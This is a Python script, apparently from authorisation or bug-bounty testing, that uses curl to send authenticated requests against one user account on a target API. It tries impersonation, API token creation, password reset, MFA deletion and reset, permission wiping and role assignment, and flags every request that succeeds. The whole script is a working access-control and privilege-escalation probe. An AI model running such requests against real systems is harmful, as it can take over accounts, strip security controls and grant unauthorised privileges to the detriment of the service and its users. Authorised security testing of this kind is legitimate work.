import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','25','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
paths=[
 ('POST','/api/v1/users/230/manage_skills',{"skills":[]}),
 ('GET','/api/v1/users/230/manage_skills',None),
 ('POST','/api/v1/users/230/impersonate',{}),
 ('POST','/api/v1/users/impersonate',{"id":230}),
 ('POST','/api/v1/users/230/token',{}),
 ('POST','/api/v1/users/230/api_token',{}),
 ('GET','/api/v1/users/230/api_token',None),
 ('POST','/api/v1/users/230/unlock',{}),
 ('POST','/api/v1/users/230/reset_password',{}),
 ('POST','/api/v1/users/230/mfa',{}),
 ('DELETE','/api/v1/users/230/mfa',None),
 ('POST','/api/v1/users/230/mfa/reset',{}),
 ('GET','/api/v1/users/230/permissions',None),
 ('PUT','/api/v1/users/230/permissions',{"permissions":[]}),
 ('POST','/api/v1/users/230/roles',{"role_id":1}),
 ('PUT','/api/v1/users/230/role',{"role_id":1}),
]
for m,p,b in paths:
    c,txt=req(m,p,b)
    flag='  <<<' if c in ('200','201','204') else ''
    print(f"{c} {m:6} {p}  {txt[:120].replace(chr(10),' ')}{flag}")
